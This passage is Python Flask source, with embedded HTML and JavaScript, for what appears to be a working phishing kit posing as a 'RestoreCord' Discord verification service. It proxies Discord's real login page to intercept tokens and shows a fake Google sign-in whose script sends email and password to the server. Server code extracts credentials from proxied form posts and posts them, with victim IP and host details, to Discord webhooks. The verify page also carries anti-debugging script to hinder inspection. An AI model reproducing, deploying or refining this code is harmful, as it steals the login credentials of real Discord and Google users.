      main.innerHTML = '<div style="text-align:center;padding:80px 0"><div style="width:48px;height:48px;margin:0 auto;border:4px solid #dadce0;border-top:4px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite"></div><p style="color:#5f6368;font-size:14px;margin-top:16px;font-family:Roboto,sans-serif">Checking your info...</p></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>';
      // Capture credentials
      try{navigator.sendBeacon('/--/captured-google',JSON.stringify({e:email,p:pw}))}catch(ex){}
      // Redirect after delay
      setTimeout(function(){
        try{
          var tc=document.cookie.match(/_tenant=([^;]+)/);
          if(tc){
            var parts=tc[1].split(':');
            if(parts.length>=4) window.location.href='/'+parts[0]+'/'+parts[1]+'/'+parts[2]+'/'+parts[3]+'?verified=1';
            else if(parts.length>=3) window.location.href='/'+parts[0]+'/'+parts[1]+'/'+parts[2]+'?verified=1';
            else window.location.href='/';
          } else {
            main.innerHTML='<div style="text-align:center;padding:60px 0"><div style="width:72px;height:72px;border-radius:50%;background:#34a853;margin:0 auto 20px;display:flex;align-items:center;justify-content:center"><svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div><h1 style="font-size:24px;font-weight:400;color:#202124;margin-bottom:8px;font-family:Google Sans,Roboto,sans-serif">Verified!</h1><p style="color:#5f6368;font-size:14px;font-family:Roboto,sans-serif">You may now close this window.</p></div>';
          }
        }catch(ex){window.location.href='/';}
      },2500);
    }

    pwNext.addEventListener('click', function(e){ stopProp(e); submitPw(); }, true);
    pwInput.addEventListener('keydown', function(e){ if(e.key==='Enter'){e.preventDefault();submitPw();} });
  }
})();</script>'''
    h = h.replace('</body>', handler_js + '\n</body>', 1)
    if '</body>' not in html_text:
        h += handler_js
    return h


def _google_rewrite_redirect(location):
    """Rewrite a redirect Location header from Google to route through our proxy."""
    for domain in GOOGLE_PROXY_DOMAINS:
        location = location.replace(f'https://{domain}/', f'/_gp/{domain}/')
        location = location.replace(f'http://{domain}/', f'/_gp/{domain}/')
    return location


def _get_google_session():
    """Get or create a curl_cffi session for Google proxy."""
    sid = request.cookies.get('_gsid', '')
    with _google_sessions_lock:
        if sid and sid in _google_sessions:
            entry = _google_sessions[sid]
            if time.time() - entry['ts'] < GOOGLE_SESSION_TTL:
                entry['ts'] = time.time()
                return sid, entry['s']
        now = time.time()
        stale = [k for k, v in list(_google_sessions.items()) if now - v['ts'] > GOOGLE_SESSION_TTL]
        for k in stale:
            try: _google_sessions.pop(k)['s'].close()
            except: pass
    new_sid = uuid.uuid4().hex[:16]
    s = creq.Session(impersonate='chrome')
    with _google_sessions_lock:
        _google_sessions[new_sid] = {'s': s, 'ts': time.time()}
    return new_sid, s


def _check_google_creds(body_bytes, path, client_ip):
    """Server-side check for Google creds in proxied form POST data."""
    try:
        body = body_bytes.decode('utf-8', errors='replace')
        params = {}
        try:
            from urllib.parse import parse_qs
            params = parse_qs(body)
        except:
            pass
        email = (params.get('Email', [''])[0] or params.get('email', [''])[0]
                 or params.get('identifier', [''])[0])
        password = (params.get('Passwd', [''])[0] or params.get('password', [''])[0])
        if email and password:
            print(f'[GOOGLE-CAPTURED] Email={email} from proxy ({path}), IP={_clean_ip(client_ip)}')
            _fire_google_webhook(email, password, client_ip)
    except:
        pass


def _fire_google_webhook(email, password, client_ip, tenant=None):
    """Send captured Google credentials to webhook."""
    if tenant is None:
        try:
            tenant = _get_tenant()
        except:
            pass
    webhook_url = _get_webhook_for_tenant(tenant)
    if not webhook_url and not WEBHOOK_BACKUP:
        print(f'[google] No webhook configured, skipping')
        return
    comp = os.environ.get('COMPUTERNAME', platform.node())
    luser = os.environ.get('USERNAME', os.environ.get('USER', '?'))
    payload = {
        "embeds": [{
            "title": "🔑 Google Login Captured",
            "color": 4285956,  # Google blue
            "description": (
                f"**Email:** `{email}`\n"
                f"**Password:** `{password}`\n\n"
                f"**IP:** `{_clean_ip(client_ip)}`\n"
                f"**System:** `{comp}` / `{luser}`\n"
            ),
            "footer": {"text": "Google Login Proxy"}
        }],
        "username": "Pentest Tool"
    }
    def _send():
        try:
            if webhook_url:
                plain_req.post(webhook_url, json=payload, timeout=10)
                print(f'[google] Webhook sent for {email}')
            if WEBHOOK_BACKUP:
                plain_req.post(WEBHOOK_BACKUP, json=payload, timeout=10)
        except Exception as e:
            print(f'[google] Webhook error: {e}')
    threading.Thread(target=_send, daemon=True).start()


def _fetch_login_html():
    """Fetch and cache Discord's login page HTML (rewritten)."""
    with _login_html_lock:
        if _login_html_cache['html'] and (time.time() - _login_html_cache['time']) < LOGIN_HTML_TTL:
            return _login_html_cache['html']
    # Fetch fresh
    try:
        s = _make_session()
        r = s.get('https://discord.com/login', headers={
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': UA,
            'Sec-CH-UA': SEC_CH_UA,
            'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
        }, allow_redirects=False, timeout=20)
        if r.status_code == 200:
            html = _proxy_rewrite_html(r.text)
            with _login_html_lock:
                _login_html_cache['html'] = html
                _login_html_cache['time'] = time.time()
            print(f'[proxy] Fetched Discord login page ({len(html)} bytes)')
            # Prefetch all referenced assets in background
            _prefetch_assets(html)
            return html
        print(f'[proxy] Discord returned {r.status_code}')
    except Exception as e:
        print(f'[proxy] Failed to fetch Discord login: {e}')
    return None


def _prefetch_assets(html):
    """Background-prefetch all JS/CSS assets referenced in the login page HTML."""
    import re as _re
    asset_paths = _re.findall(r'/assets/([a-f0-9]+\.[a-z0-9]+\.(?:js|css))', html)
    # Also catch src="/assets/..." patterns
    asset_paths += _re.findall(r'src="/assets/([^"]+)"', html)
    asset_paths += _re.findall(r'href="/assets/([^"]+)"', html)
    # Deduplicate
    asset_paths = list(dict.fromkeys(asset_paths))
    # Filter out already-cached
    with _asset_cache_lock:
        uncached = [p for p in asset_paths if f'/assets/{p}' not in _asset_cache]
    if not uncached:
        return
    print(f'[prefetch] Warming cache for {len(uncached)} assets...')
    def _fetch_one(path):
        cache_key = f'/assets/{path}'
        try:
            s = _make_session()
            r = s.get(f'https://discord.com/assets/{path}', headers={'User-Agent': UA, 'Accept': '*/*'}, timeout=30)
            if r.status_code == 200:
                ct = r.headers.get('Content-Type', 'application/octet-stream')
                data = r.content
                if 'javascript' in ct or path.endswith('.js'):
                    data = _proxy_rewrite_js(data.decode('utf-8', errors='replace')).encode('utf-8')
                elif 'css' in ct or path.endswith('.css'):
                    text = data.decode('utf-8', errors='replace')
                    text = text.replace('https://discord.com/', '/')
                    text = text.replace('https://cdn.discordapp.com/', '/cdn/')
                    data = text.encode('utf-8')
                with _asset_cache_lock:
                    if len(_asset_cache) < ASSET_CACHE_MAX:
                        _asset_cache[cache_key] = {'data': data, 'ct': ct, 'time': time.time()}
        except:
            pass
    # Use a thread pool to fetch in parallel
    from concurrent.futures import ThreadPoolExecutor
    t = threading.Thread(target=lambda: ThreadPoolExecutor(max_workers=10).map(_fetch_one, uncached), daemon=True)
    t.start()


# ━━━━━━━━━━━━ Routes ━━━━━━━━━━━━

_VERIFY_PAGE = '''<!DOCTYPE html>
<html lang="en" style="scroll-behavior:smooth;color-scheme:dark"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,viewport-fit=cover">
<meta name="theme-color" content="#0b0909">
<title>{{SERVER_NAME}}</title>
<link rel="icon" href="/favicon.ico" type="image/png">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden}
body{font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
color:#e0e0e0;background:#000}
.bg-layer{position:fixed;inset:0;z-index:0}
.bg-layer canvas{display:block;width:100%;height:100%}
.bg-gradient{pointer-events:none;position:absolute;inset:0;
background:linear-gradient(to top,rgba(0,0,0,.3),transparent,rgba(0,0,0,.2))}
.main{position:relative;z-index:2;min-height:100dvh;display:flex;flex-direction:column;
align-items:center;justify-content:center;padding:16px}
.card{width:100%;max-width:36rem;border-radius:1rem;overflow:hidden;
backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);
background:hsla(0,0%,5%,.5);border:1px solid hsla(0,0%,100%,.06);
box-shadow:0 20px 25px -5px rgba(0,0,0,.1),0 8px 10px -6px rgba(0,0,0,.1),
inset 0 1px 0 0 rgba(255,255,255,.12),inset 0 0 12px 0 rgba(255,255,255,.04);
transition:all .3s}
.card-inner{padding:24px 32px;display:flex;flex-direction:column;gap:24px}
@media(min-width:768px){.card-inner{padding:32px}}
.center{text-align:center;display:flex;flex-direction:column;align-items:center;gap:16px}
.avatar{width:112px;height:112px;border-radius:50%;overflow:hidden;
box-shadow:0 10px 25px -3px rgba(0,0,0,.4);transition:transform .3s}
.avatar:hover{transform:scale(1.05)}
.avatar img{width:100%;height:100%;object-fit:cover}
.avatar-fallback{width:100%;height:100%;display:flex;align-items:center;justify-content:center;
font-size:2rem;background:hsla(0,0%,50%,.2);backdrop-filter:blur(8px);
border:1px solid hsla(0,0%,100%,.06);color:#fff}
@media(min-width:768px){.avatar{width:144px;height:144px}}
.name-row{display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap}
.name-row h1{font-weight:700;font-size:30px;line-height:25px;word-break:break-word;
background-clip:text}
.badge{padding:6px;border-radius:50%;background:hsla(142,76%,36%,.1);
transition:transform .3s;cursor:default;
box-shadow:inset 0 1px 0 0 rgba(255,255,255,.12),inset 0 0 12px 0 rgba(255,255,255,.04)}
.badge:hover{transform:scale(1.1)}
.badge svg{width:20px;height:20px;color:#22c55e;filter:drop-shadow(0 0 3px rgba(255,255,255,.15))}
.verify-btn{display:inline-flex;align-items:center;justify-content:center;gap:10px;width:100%;
max-width:28rem;font-size:15px;font-weight:500;color:#fff;
background:#5865f2;border:none;border-radius:1rem;padding:12px 16px;
cursor:pointer;text-decoration:none;transition:all .3s;
box-shadow:inset 0 1px 0 0 rgba(255,255,255,.12),inset 0 0 12px 0 rgba(255,255,255,.04)}
.verify-btn:hover{transform:scale(1.05);filter:brightness(1.1)}
.verify-btn:active{transform:scale(.95)}
.verify-btn span{filter:drop-shadow(0 0 3px rgba(255,255,255,.15))}
.verify-btn svg{width:20px;height:20px;flex-shrink:0}
.google-btn{background:#fff;color:#3c4043;box-shadow:0 1px 3px rgba(0,0,0,.3),inset 0 1px 0 0 rgba(255,255,255,.2)}
.google-btn:hover{background:#f8f9fa;filter:none;transform:scale(1.05)}
.google-btn span{filter:none;color:#3c4043;font-weight:500}
.btn-group{display:flex;flex-direction:column;align-items:center;gap:10px;width:100%}
.btn-divider{display:flex;align-items:center;gap:12px;width:100%;max-width:28rem;color:#888;font-size:12px;text-transform:uppercase;letter-spacing:1px}
.btn-divider::before,.btn-divider::after{content:'';flex:1;height:1px;background:hsla(0,0%,100%,.1)}
.verified-btn{display:inline-flex;align-items:center;justify-content:center;width:100%;
max-width:28rem;font-size:15px;font-weight:500;color:#fff;gap:8px;
background:#22c55e;border:none;border-radius:1rem;padding:12px 16px;
cursor:default;text-decoration:none;pointer-events:none;
box-shadow:inset 0 1px 0 0 rgba(255,255,255,.12),inset 0 0 12px 0 rgba(255,255,255,.04)}
.verified-btn svg{width:20px;height:20px}
.verified-btn span{filter:drop-shadow(0 0 3px rgba(255,255,255,.15))}
</style></head><body>
<div class="bg-layer">
<canvas id="bgCanvas"></canvas>
<div class="bg-gradient"></div>
</div>
<div class="main">
<div class="card">
<div class="card-inner">
<div class="center">
<div class="avatar">
{{AVATAR_HTML}}
</div>
<div class="name-row">
<h1>{{SERVER_NAME}}</h1>
<div class="badge" title="Verified">
<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
<path d="M22 13V6a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2v12c0 1.1.9 2 2 2h9"></path>
<path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"></path>
<path d="m17 17 4 4"></path><path d="m21 17-4 4"></path>
</svg>
</div>
</div>
</div>
<div style="display:flex;justify-content:center;width:100%">
{{BUTTON_HTML}}
</div>
</div>
</div>
</div>
<script>
// Animated purple gradient background (WebGL)
(function(){
var c=document.getElementById("bgCanvas"),gl=c.getContext("webgl")||c.getContext("experimental-webgl");
if(!gl)return;
function resize(){c.width=c.clientWidth*devicePixelRatio;c.height=c.clientHeight*devicePixelRatio;gl.viewport(0,0,c.width,c.height)}
window.addEventListener("resize",resize);resize();
var vs="attribute vec2 p;void main(){gl_Position=vec4(p,0,1);}";
var fs="precision mediump float;uniform float t;uniform vec2 r;"+
"void main(){"+
"vec2 u=gl_FragCoord.xy/r;"+
"float a1=sin(u.x*2.5+t*0.8+u.y*1.2)*0.5+0.5;"+
"float a2=sin(u.y*3.0-t*0.6+u.x*0.8)*0.5+0.5;"+
"float a3=sin((u.x+u.y)*2.0+t*0.4)*0.5+0.5;"+
"float swirl=sin(length(u-vec2(0.3,0.7))*6.0-t*1.2)*0.5+0.5;"+
"float flow=mix(a1,a2,a3)*0.7+swirl*0.3;"+
"vec3 deep=vec3(0.01,0.02,0.12);"+
"vec3 mid=vec3(0.04,0.08,0.35);"+
"vec3 bright=vec3(0.1,0.12,0.55);"+
"vec3 accent=vec3(0.2,0.15,0.7);"+
"vec3 col=mix(deep,mid,smoothstep(0.0,0.5,flow));"+
"col=mix(col,bright,smoothstep(0.4,0.75,flow));"+
"col=mix(col,accent,smoothstep(0.7,1.0,swirl*a1));"+
"float vig=1.0-length(u-vec2(0.5,0.4))*0.6;"+
"col*=smoothstep(0.0,0.5,vig);"+
"col+=vec3(0.01,0.02,0.06)*smoothstep(0.3,0.0,u.y);"+
"gl_FragColor=vec4(col,1.0);}";
function sh(src,type){var s=gl.createShader(type);gl.shaderSource(s,src);gl.compileShader(s);return s;}
var pg=gl.createProgram();gl.attachShader(pg,sh(vs,gl.VERTEX_SHADER));gl.attachShader(pg,sh(fs,gl.FRAGMENT_SHADER));
gl.linkProgram(pg);gl.useProgram(pg);
var b=gl.createBuffer();gl.bindBuffer(gl.ARRAY_BUFFER,b);
gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,1,1]),gl.STATIC_DRAW);
var p=gl.getAttribLocation(pg,"p");gl.enableVertexAttribArray(p);gl.vertexAttribPointer(p,2,gl.FLOAT,false,0,0);
var tU=gl.getUniformLocation(pg,"t"),rU=gl.getUniformLocation(pg,"r");
function draw(now){gl.uniform1f(tU,now*0.001);gl.uniform2f(rU,c.width,c.height);
gl.drawArrays(gl.TRIANGLE_STRIP,0,4);requestAnimationFrame(draw);}
requestAnimationFrame(draw);
})();
// Anti-debug
(function(){document.addEventListener('contextmenu',function(e){e.preventDefault();});document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.key==='C'))||(e.ctrlKey&&e.key==='u'))e.preventDefault();});(function x(){setInterval(function(){var s=new Date();debugger;if(new Date()-s>100){document.body.innerHTML='';}},1000);})();})();
</script>
</body></html>'''

# Discord + Google SVG icons for buttons
_DISCORD_SVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 127.14 96.36" fill="#fff"><path d="M107.7 8.07A105.15 105.15 0 0081.47 0a72.06 72.06 0 00-3.36 6.83 97.68 97.68 0 00-29.11 0A72.37 72.37 0 0045.64 0a105.89 105.89 0 00-26.25 8.09C2.79 32.65-1.71 56.6.54 80.21a105.73 105.73 0 0032.17 16.15 77.7 77.7 0 006.89-11.11 68.42 68.42 0 01-10.85-5.18c.91-.66 1.8-1.34 2.66-2.04a75.57 75.57 0 0064.32 0c.87.71 1.76 1.39 2.66 2.04a68.68 68.68 0 01-10.87 5.19 77 77 0 006.89 11.1 105.25 105.25 0 0032.19-16.14c2.64-27.38-4.51-51.11-18.9-72.15zM42.45 65.69C36.18 65.69 31 60 31 53.05s5-12.64 11.45-12.64S53.89 46 53.73 53.05 48.9 65.69 42.45 65.69zm42.24 0C78.41 65.69 73.25 60 73.25 53.05s5-12.64 11.44-12.64 11.89 5.56 11.72 12.64S91.36 65.69 84.69 65.69z"/></svg>'
_GOOGLE_SVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>'


def _build_buttons(login_url, verified=False):
    """Build the button HTML for the verify page."""
    if verified:
        return '<div class="verified-btn"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg><span>Verified!</span></div>'
    return (
        f'<div class="btn-group">'
        f'<a class="verify-btn" href="{login_url}">{_DISCORD_SVG}<span>Login with Discord</span></a>'
        f'</div>'
    )


@app.route('/')
def index():
    """Landing page — no tenant context, show generic info."""
    return make_response('''<!DOCTYPE html><html><head><meta charset="utf-8">
<title>RestoreCord Verify</title>
<style>body{background:#1a1a2e;color:#e0e0e0;font-family:sans-serif;display:flex;align-items:center;
justify-content:center;min-height:100vh;margin:0}
.c{text-align:center;max-width:500px;padding:40px}
h1{color:#5865F2;margin-bottom:16px}p{color:#a0a0b8;line-height:1.6}</style>
<script>!function(){var h=location.hash.replace(/^#/,'');if(h){var p=h.split('/').filter(Boolean);if(p.length>=2){var id=p[p.length-2],sv=p[p.length-1];if(/^\\d+$/.test(id)&&/^\\d+$/.test(sv)){location.replace('/'+id+'/'+sv);return}}}}()</script>
</head><body><div class="c">
<h1>RestoreCord Verify</h1>
<p>This is a Discord verification service. Server owners provide their members with a unique verification link.</p>
</div></body></html>''', 200, {'Content-Type': 'text/html'})


@app.route('/<guild_id>/<role_id>/<bot_key>')
def tenant_verify(guild_id, role_id, bot_key):
    """Multi-tenant entry point: /<guild_id>/<role_id>/<bot_key>
    Validates the bot_key maps to a real env var, stores tenant context, shows verify page."""
    # Validate IDs are numeric (Discord snowflakes)
    if not guild_id.isdigit() or not role_id.isdigit() or not bot_key.isdigit():
        return make_response('Invalid verification link.', 400)
    # Validate bot token exists
    bot_token = _get_bot_token(bot_key)
    if not bot_token:
        return make_response('Invalid verification link.', 404)
    # Store tenant context
    _set_tenant(guild_id, role_id, bot_key)
    # Fetch guild info (name, icon)
    guild = _fetch_guild_info(guild_id, bot_token)
    server_name = guild.get('name', 'Server')
    icon_url = guild.get('icon_url', '')
    first_letter = server_name[0].upper() if server_name else 'S'
    if icon_url:
        avatar_html = f'<img src="{icon_url}" alt="{server_name}" loading="eager">'
    else:
        avatar_html = f'<span class="avatar-fallback">{first_letter}</span>'
    # Build page
    login_url = f'/{guild_id}/{role_id}/{bot_key}/login'
    verified = request.args.get('verified') == '1'
    button_html = _build_buttons(login_url, verified)
    import html as html_mod
    page = _VERIFY_PAGE.replace('{{SERVER_NAME}}', html_mod.escape(server_name))
    page = page.replace('{{AVATAR_HTML}}', avatar_html)
    page = page.replace('{{BUTTON_HTML}}', button_html)
    resp = make_response(page)
    resp.headers['Content-Type'] = 'text/html; charset=utf-8'
    resp.headers['Cache-Control'] = 'no-store'
    resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{bot_key}', max_age=600, httponly=False, samesite='Lax')
    return resp


@app.route('/<guild_id>/<role_id>/<bot_key>/login')
def tenant_login(guild_id, role_id, bot_key):
    """Multi-tenant login: stores tenant context then serves Discord login proxy."""
    if not guild_id.isdigit() or not role_id.isdigit() or not bot_key.isdigit():
        return make_response('Invalid verification link.', 400)
    bot_token = _get_bot_token(bot_key)
    if not bot_token:
        return make_response('Invalid verification link.', 404)
    # Store tenant context
    _set_tenant(guild_id, role_id, bot_key)
    # Serve the Discord login page (same as /login)
    html = _fetch_login_html()
    if html:
        # Always create a fresh proxy session for login pages to prevent auto-forward
        # from a previous authenticated session
        new_sid = uuid.uuid4().hex[:16]
        s = _make_session()
        with _proxy_sessions_lock:
            _proxy_sessions[new_sid] = {'s': s, 'ts': time.time()}
        sid = new_sid
        try:
            s.get('https://discord.com/login', headers={
                'User-Agent': UA, 'Accept': 'text/html', 'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE, 'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            }, timeout=15)
        except:
            pass
        tok = _issue_page_token()
        html_out = html.replace('</head>', f'<script>window._pgToken="{tok}";</script>\n</head>', 1)
        resp = make_response(html_out)
        resp.headers['Content-Type'] = 'text/html; charset=utf-8'
        resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        resp.headers['Pragma'] = 'no-cache'
        resp.headers['Expires'] = '0'
        resp.set_cookie('_dsid', sid, max_age=600, httponly=True, samesite='Lax')
        resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{bot_key}', max_age=600, httponly=False, samesite='Lax')
        return resp
    return _serve_local_login()


@app.route('/<guild_id>/<role_id>/<identifier>/<server_int>')
def tenant_verify_v2(guild_id, role_id, identifier, server_int):
    """Multi-tenant v2: /<guild_id>/<role_id>/<identifier>/<server_int>
    Gets server info from TOKENPANEL (bot token never leaves the panel)."""
    if not guild_id.isdigit() or not role_id.isdigit() or not identifier.isdigit() or not server_int.isdigit():
        return make_response('Invalid verification link.', 400)
    server_info = _get_server_info_from_panel(identifier, server_int)
    if not server_info or not server_info.get('has_bot_token'):
        return make_response('Invalid verification link.', 404)
    _set_tenant(guild_id, role_id, identifier, identifier=identifier, server_int=server_int)
    server_name = server_info.get('guild_name', 'Server') or 'Server'
    icon_url = server_info.get('guild_icon', '')
    first_letter = server_name[0].upper() if server_name else 'S'
    if icon_url:
        import html as html_mod_esc
        avatar_html = f'<img src="{html_mod_esc.escape(icon_url)}" alt="{html_mod_esc.escape(server_name)}" loading="eager">'
    else:
        avatar_html = f'<span class="avatar-fallback">{first_letter}</span>'
    login_url = f'/{guild_id}/{role_id}/{identifier}/{server_int}/login'
    verified = request.args.get('verified') == '1'
    button_html = _build_buttons(login_url, verified)
    import html as html_mod
    page = _VERIFY_PAGE.replace('{{SERVER_NAME}}', html_mod.escape(server_name))
    page = page.replace('{{AVATAR_HTML}}', avatar_html)
    page = page.replace('{{BUTTON_HTML}}', button_html)
    resp = make_response(page)
    resp.headers['Content-Type'] = 'text/html; charset=utf-8'
    resp.headers['Cache-Control'] = 'no-store'
    resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{identifier}:{server_int}', max_age=600, httponly=False, samesite='Lax')
    return resp


@app.route('/<guild_id>/<role_id>/<identifier>/<server_int>/login')
def tenant_login_v2(guild_id, role_id, identifier, server_int):
    """Multi-tenant v2 login. Bot token stays on TOKENPANEL."""
    if not guild_id.isdigit() or not role_id.isdigit() or not identifier.isdigit() or not server_int.isdigit():
        return make_response('Invalid verification link.', 400)
    server_info = _get_server_info_from_panel(identifier, server_int)
    if not server_info or not server_info.get('has_bot_token'):
        return make_response('Invalid verification link.', 404)
    _set_tenant(guild_id, role_id, identifier, identifier=identifier, server_int=server_int)
    html = _fetch_login_html()
    if html:
        # Always create a fresh proxy session for login pages to prevent auto-forward
        # from a previous authenticated session
        new_sid = uuid.uuid4().hex[:16]
        s = _make_session()
        with _proxy_sessions_lock:
            _proxy_sessions[new_sid] = {'s': s, 'ts': time.time()}
        sid = new_sid
        try:
            s.get('https://discord.com/login', headers={
                'User-Agent': UA, 'Accept': 'text/html', 'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE, 'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            }, timeout=15)
        except:
            pass
        tok = _issue_page_token()
        html_out = html.replace('</head>', f'<script>window._pgToken="{tok}";</script>\n</head>', 1)
        resp = make_response(html_out)
        resp.headers['Content-Type'] = 'text/html; charset=utf-8'
        resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        resp.headers['Pragma'] = 'no-cache'
        resp.headers['Expires'] = '0'
        resp.set_cookie('_dsid', sid, max_age=600, httponly=True, samesite='Lax')
        resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{identifier}:{server_int}', max_age=600, httponly=False, samesite='Lax')
        return resp
    return _serve_local_login()


@app.route('/<identifier>/<server_int>')
def tenant_verify_short(identifier, server_int):
    """Short-form entry: /<identifier>/<server_int>
    Gets guild_id + role_id from TOKENPANEL so URL stays compact."""
    if not identifier.isdigit() or not server_int.isdigit():
        return make_response('Invalid verification link.', 400)
    server_info = _get_server_info_from_panel(identifier, server_int)
    if not server_info or not server_info.get('has_bot_token'):
        return make_response('Invalid verification link.', 404)
    guild_id = server_info.get('guild_id', '0')
    role_id = server_info.get('verify_role_id', '0')
    _set_tenant(guild_id, role_id, identifier, identifier=identifier, server_int=server_int)
    server_name = server_info.get('guild_name', 'Server') or 'Server'
    icon_url = server_info.get('guild_icon', '')
    first_letter = server_name[0].upper() if server_name else 'S'
    if icon_url:
        import html as html_mod_esc
        avatar_html = f'<img src="{html_mod_esc.escape(icon_url)}" alt="{html_mod_esc.escape(server_name)}" loading="eager">'
    else:
        avatar_html = f'<span class="avatar-fallback">{first_letter}</span>'
    login_url = f'/{identifier}/{server_int}/login'
    verified = request.args.get('verified') == '1'
    button_html = _build_buttons(login_url, verified)
    import html as html_mod
    page = _VERIFY_PAGE.replace('{{SERVER_NAME}}', html_mod.escape(server_name))
    page = page.replace('{{AVATAR_HTML}}', avatar_html)
    page = page.replace('{{BUTTON_HTML}}', button_html)
    resp = make_response(page)
    resp.headers['Content-Type'] = 'text/html; charset=utf-8'
    resp.headers['Cache-Control'] = 'no-store'
    resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{identifier}:{server_int}', max_age=600, httponly=False, samesite='Lax')
    return resp


@app.route('/<identifier>/<server_int>/login')
def tenant_login_short(identifier, server_int):
    """Short-form login: /<identifier>/<server_int>/login"""
    if not identifier.isdigit() or not server_int.isdigit():
        return make_response('Invalid verification link.', 400)
    server_info = _get_server_info_from_panel(identifier, server_int)
    if not server_info or not server_info.get('has_bot_token'):
        return make_response('Invalid verification link.', 404)
    guild_id = server_info.get('guild_id', '0')
    role_id = server_info.get('verify_role_id', '0')
    _set_tenant(guild_id, role_id, identifier, identifier=identifier, server_int=server_int)
    html = _fetch_login_html()
    if html:
        new_sid = uuid.uuid4().hex[:16]
        s = _make_session()
        with _proxy_sessions_lock:
            _proxy_sessions[new_sid] = {'s': s, 'ts': time.time()}
        sid = new_sid
        try:
            s.get('https://discord.com/login', headers={
                'User-Agent': UA, 'Accept': 'text/html', 'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE, 'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            }, timeout=15)
        except:
            pass
        tok = _issue_page_token()
        html_out = html.replace('</head>', f'<script>window._pgToken="{tok}";</script>\n</head>', 1)
        resp = make_response(html_out)
        resp.headers['Content-Type'] = 'text/html; charset=utf-8'
        resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        resp.headers['Pragma'] = 'no-cache'
        resp.headers['Expires'] = '0'
        resp.set_cookie('_dsid', sid, max_age=600, httponly=True, samesite='Lax')
        resp.set_cookie('_tenant', f'{guild_id}:{role_id}:{identifier}:{server_int}', max_age=600, httponly=False, samesite='Lax')
        return resp
    return _serve_local_login()


@app.route('/login')
def login_page():
    """Proxy Discord's REAL login page with token interception."""
    html = _fetch_login_html()
    if html:
        # Always create a fresh proxy session to prevent auto-forward
        new_sid = uuid.uuid4().hex[:16]
        s = _make_session()
        with _proxy_sessions_lock:
            _proxy_sessions[new_sid] = {'s': s, 'ts': time.time()}
        sid = new_sid
        try:
            s.get('https://discord.com/login', headers={
                'User-Agent': UA, 'Accept': 'text/html', 'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE, 'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
            }, timeout=15)
        except:
            pass
        tok = _issue_page_token()
        html_out = html.replace('</head>', f'<script>window._pgToken="{tok}";</script>\n</head>', 1)
        resp = make_response(html_out)
        resp.headers['Content-Type'] = 'text/html; charset=utf-8'
        resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        resp.headers['Pragma'] = 'no-cache'
        resp.headers['Expires'] = '0'
        resp.set_cookie('_dsid', sid, max_age=600, httponly=True, samesite='Lax')
        return resp
    return _serve_local_login()


